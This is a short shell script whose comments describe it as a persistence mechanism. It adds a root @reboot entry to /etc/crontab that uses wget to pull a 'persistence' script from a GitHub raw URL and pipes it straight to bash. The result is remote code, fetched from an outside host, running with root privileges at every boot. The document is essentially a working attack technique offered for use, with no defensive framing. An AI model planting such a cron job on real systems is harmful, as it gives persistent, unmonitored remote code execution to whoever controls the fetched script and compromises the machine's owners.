# a cronjob to connects to my github repo and pulls the latest version of my persistence scripts and executes them

# the script url to pull from github
script_url="https://raw.githubusercontent.com/saboor-hakimi/persistence/master/persistence_user.sh"


# create a cronjob to run the script every time the system boots
echo "@reboot root wget -q -O - $script_url | bash" >> /etc/crontab
